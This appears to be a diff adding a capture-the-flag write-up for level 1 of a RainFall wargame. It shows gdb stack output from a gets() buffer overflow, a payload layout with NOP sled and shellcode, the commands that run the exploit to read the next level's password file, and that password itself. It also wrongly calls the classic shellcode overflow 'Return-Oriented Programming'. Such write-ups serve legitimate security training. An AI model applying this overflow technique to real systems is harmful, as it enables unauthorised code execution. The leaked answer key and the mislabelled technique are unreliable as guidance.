@@ -1,0 +1,32 @@
+# This binary contains a simple main with a buffer and a call to gets.
+# See the source code for a c implementation.
+# If we input the string 'AAAABBBBCCCCDDDD' after reaching the call to gets,
+# this is the state of the program's stack :
+
+(gdb) x/24wx $esp
+0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
+0xbffff6c0:	0x41414141	0x42424242	0x43434343	0x44444444 <== our input string
+0xbffff6d0:	0xb7fd1300	0x0000000d	0x0804978c	0x080484c1
+0xbffff6e0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+0xbffff6f0:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
+0xbffff700:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
+
+# As we can see, the buffer is declared on the stack, which means the program
+# is vulnerable to Return-Oriented Programming (ROP).
+# The objective here is to overwrite the return address of the main function
+# by inputing a payload of the following structure :
+# (P stands for padding, A for address, N for the NOP sled and S for shellcode) :
+
+[72 bytes][4 bytes][4 bytes]   [>= 100 bytes][? bytes]
+[buffer]  [ebp]    [ret]	   [nopsled]	 [shellcode]
+[PPPPPPPPPPPPPPPPP][AAAA]	
+[AAAA...		  ][0xbffff7XX][NNNNNNNNNNNN][SSSSSSS]
+							|--------^
+
+# The code for generating the payload is located in ./Resources/exploit.py.
+# Finally, the solution :
+
+level1@RainFall: python /tmp/exploit.py > /tmp/bad
+level1@RainFall:~$ cat /tmp/bad - | ./level1
+cat /home/user/$(whoami)/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
